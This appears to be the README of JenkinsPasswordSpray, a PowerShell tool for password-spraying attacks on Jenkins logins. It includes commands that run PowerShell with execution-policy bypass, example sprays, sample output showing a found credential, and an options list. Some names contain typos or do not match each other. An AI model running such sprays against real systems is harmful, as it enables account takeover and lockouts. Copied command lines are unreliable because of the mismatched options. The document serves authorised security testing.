# JenkinsPasswordSpray
JenkinsPasswordSpray is a tool witten i PowerShell to perform password spraying attacks against users of a [Jenkins](https://jenkins.io/) instance. Be careful not to lock out accounts!

## Quick Start Guide
Open a PowerShell terminal from the Windows command line with `powershell.exe -exec bypass` and import the module with `Import-Module JenkinsPasswordSpray.ps1`.

The required options are `URL`, `Username`/`UsernameFile` and `Password`/`PasswordFile`.

The following command will spray against a list of users and attempt to authenticate using each username and a password from the specified list. If a valid login is found, the script will stop unless `-ContinueOnSuccess` is set to `$True`. A confirmation will be prompted unless the `-Force` switch is set. The results of the spray will be output to a file called `sprayed-jenkins.txt`

The script will also try to help you clean up your URL if it's invalid or contains trailing elements like `/login`, as this will make the URL invalid for password spraying. But because your target Jenkins instance might be located in a subdirectory, this feature asks for confirmation before trimming the URL.

Type `Get-Help Invoke-JenkinsPasswordSpra` to see the different options.

### Example command

```PowerShell
Invoke-JenkinsPasswordSpray -URL http://jenkins:8080 -UsernameFile .\users.txt -PasswordFile .\pws.txt -ContinueOnSuccesss $true -Force -Outfile .\sprayed-jenkins.txt
```

### Example command with output

```PowerShell
PS C:\Windows\temp> Invoke-JenkinsPasswordSpray -URL http://10.0.0.7:8080/login/notvalid -Username jenkinsadmin -Password rush2112 -ContinueOnSuccesss $true -Force -OutFile jenkins-sprayed.txt

[-] Detected trailing elements /login/notvalid in provided URL http://10.0.0.7:8080/login/notvalid.
[-] Will now try to remove it for you.
Do you want to use the URL http://10.0.0.7:8080 instead?
[Y] Yes  [N] No  [?] Help (default is "Y"):
[+] Replacing URL: http://10.0.0.7:8080/login/notvalid
[+] Will use this URL: http://10.0.0.7:8080
[+] Testing if URL is valid
[+] Provided URL: http://10.0.0.7:8080 returns 200 OK.

[+] Start password spraying the URL http://10.0.0.7:8080 with 1 user(s) and 1 password(s). Total request count is 1. Current time is 15:21
[+] Writing successful logins to jenkins-sprayed.txt
[Attempt 1 / 1] - Spraying username:jenkinsadmin with password:rush2112
[+] SUCCESS! Username:jenkinsadmin Password:rush2112

[+] Password spraying is complete
[*] Any passwords that were successfully sprayed have been written to jenkins-sprayed.txt
```




### Invoke-JenkinsPasswordSpray Options

```
UsernameList      - A list of usernames to spray
Username          - A single username to spray.
Password          - A single password to spray for each specified username.
PasswordList      - A list of passwords, one per line, to use for the password spray.
ContinueOnSuccess - Continue spraying, even if a valid account is found.
Force             - Forces the spray to continue without prompting for confirmation.
OutFile           - A file to output the results to.
```